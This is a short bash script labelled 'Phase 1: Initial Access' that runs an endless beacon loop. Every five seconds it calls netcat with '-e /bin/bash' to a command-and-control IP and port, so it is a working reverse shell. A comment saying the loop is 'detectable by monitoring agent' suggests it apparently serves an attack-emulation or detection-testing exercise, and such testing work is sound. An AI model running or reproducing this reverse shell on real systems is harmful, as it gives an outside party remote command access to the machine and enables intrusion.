#!/bin/bash
# Phase 1: Initial Access — Beacon loop (reverse shell attempt)
# Usage: ./phase1_initial_access.sh <C2_IP> <C2_PORT>
set -euo pipefail

C2_IP="${1:?Usage: $0 <C2_IP> <C2_PORT>}"
C2_PORT="${2:-4444}"

echo "[*] Phase 1: Starting beacon loop to ${C2_IP}:${C2_PORT}"

# Beacon loop — keeps trying to connect back, detectable by monitoring agent
while true; do
    nc -w 2 "$C2_IP" "$C2_PORT" -e /bin/bash 2>/dev/null || true
    sleep 5
done
